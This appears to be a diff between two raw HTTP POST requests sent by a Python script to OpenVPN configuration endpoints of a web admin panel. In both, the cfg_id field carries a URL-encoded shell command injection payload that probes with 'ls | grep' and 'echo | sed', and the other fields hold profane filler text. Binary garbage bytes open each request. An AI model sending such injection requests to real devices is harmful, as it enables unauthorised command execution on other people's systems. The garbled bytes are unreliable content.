@@ -1,22 +1,22 @@
-'º4SEí´¥@@ma
+'º4SEÏÒ@@R
 
-øP~³DOüdxög
-[xPdµPOST /ajax/openvpn/activate_ovpncfg.php HTTP/1.1
+PðO°Þö
+«(LW³POST /ajax/openvpn/del_ovpncfg.php HTTP/1.1
 
 Host: 10.1.1.1
 
+Content-Length: 231
+
 Accept: */*
-
-Connection: keep-alive
-
-Accept-Encoding: gzip, deflate
 
 User-Agent: python-requests/2.9.1
 
-Content-Length: 199
+Accept-Encoding: gzip, deflate
 
 Content-Type: application/x-www-form-urlencoded
 
+Connection: keep-alive
 
 
-fuck=fucck+you+you+little+%26%2A%5E%24%2A%26%5E%24%2A&idk=fucck+you+you+little+%26%2A%5E%24%2A%26%5E%24%2A&cfg_id=%5C%3Bls+%5C%7C+grep+a%5C%2A%5C%3B&a=fucck+you+you+little+%26%2A%5E%24%2A%26%5E%24%2A
+
+fuck=fucck+you+you+little+%26%2A%5E%24%2A%26%5E%24%2A&idk=fucck+you+you+little+%26%2A%5E%24%2A%26%5E%24%2A&a=fucck+you+you+little+%26%2A%5E%24%2A%26%5E%24%2A&cfg_id=%5C%3Becho+%22fuck%22+%5C%7C+sed+%22s%5C%5Cf%5C%5Cd%5C%5C%22%5C%3B
